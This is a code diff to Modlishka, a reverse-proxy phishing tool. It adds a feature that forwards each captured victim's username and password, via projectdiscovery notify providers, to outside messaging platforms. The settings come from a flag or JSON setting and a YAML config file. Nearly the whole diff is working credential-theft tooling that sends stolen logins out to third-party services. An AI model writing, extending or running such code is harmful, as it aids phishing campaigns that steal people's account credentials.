@@ -34,7 +34,9 @@ import (
 	"github.com/drk1wi/Modlishka/config"
 	"github.com/drk1wi/Modlishka/log"
 	"github.com/drk1wi/Modlishka/runtime"
+	"github.com/projectdiscovery/notify/pkg/providers"
 	"github.com/tidwall/buntdb"
+	"gopkg.in/yaml.v2"
 )
 
 type ExtendedControlConfiguration struct {
@@ -42,6 +44,7 @@ type ExtendedControlConfiguration struct {
 	CredParams   *string `json:"credParams"`
 	ControlURL   *string `json:"ControlURL"`
 	ControlCreds *string `json:"ControlCreds"`
+	NotifyConfig *string `json:"NotifyConfig"`
 }
 
 type ControlConfig struct {
@@ -52,6 +55,7 @@ type ControlConfig struct {
 	url            string
 	controlUser    string
 	controlPass    string
+	notifyClient   *providers.Client
 }
 
 type RequetCredentials struct {
@@ -294,6 +298,7 @@ type CookieJar struct {
 var credentialParameters = flag.String("credParams", "", "Credential regexp with matching groups. e.g. : baase64(username_regex),baase64(password_regex)")
 var controlURL = flag.String("controlURL", "SayHello2Modlishka", "URL to view captured credentials and settings.")
 var controlCredentials = flag.String("controlCreds", "", "Username and password to protect the credentials page.  user:pass format")
+var notifyConfig = flag.String("notifyConfig", "", "Projectdiscovery notify config file for publishing captured credentials to different platforms.")
 
 var CConfig ControlConfig
 
@@ -550,16 +555,28 @@ func (config *ControlConfig) deleteEntry(victim *Victim) error {
 
 func notifyCollection(victim *Victim) {
 
+	message := ""
 	if victim.Username != "" && victim.Password != "" {
-		log.Infof("Credentials collected ID:[%s] username: %s password: %s", victim.UUID, victim.Username, victim.Password)
+		message = fmt.Sprintf("Credentials collected ID:[%s] username: %s password: %s", victim.UUID, victim.Username, victim.Password)
 	}
 
 	if victim.Username == "" && victim.Password != "" {
-		log.Infof("Password collected ID:[%s] password: %s", victim.UUID, victim.Password)
+		message = fmt.Sprintf("Password collected ID:[%s] password: %s", victim.UUID, victim.Password)
 	}
 
 	if victim.Username != "" && victim.Password == "" {
-		log.Infof("Username collected ID:[%s] username: %s ", victim.UUID, victim.Username)
+		message = fmt.Sprintf("Username collected ID:[%s] username: %s ", victim.UUID, victim.Username)
+	}
+
+	if message != "" {
+		log.Infof(message)
+
+		if CConfig.notifyClient != nil {
+			err := CConfig.notifyClient.Send(message)
+			if err != nil {
+				log.Infof("Error %s", err.Error())
+			}
+		}
 	}
 }
 
@@ -1016,6 +1033,33 @@ func init() {
 
 		}
 
+		configFile := jsonConfig.NotifyConfig
+		if configFile == nil {
+			configFile = notifyConfig
+		}
+
+		if configFile != nil {
+			bytes, err := os.ReadFile(*configFile)
+			if err != nil {
+				log.Errorf("Error opening notify configuration (%s): %s", *configFile, err)
+				return
+			}
+
+			var providerOptions *providers.ProviderOptions
+			err = yaml.Unmarshal(bytes, &providerOptions)
+			if err != nil {
+				log.Errorf("Error unmarshalling notify configuration (%s): %s", *configFile, err)
+				return
+			}
+
+			client, err := providers.New(providerOptions, nil)
+			if err != nil {
+				log.Errorf("Error creating notify client (%s): %s", *configFile, err)
+				return
+			}
+
+			CConfig.notifyClient = client
+		}
 	}
 
 	// Register your http handlers
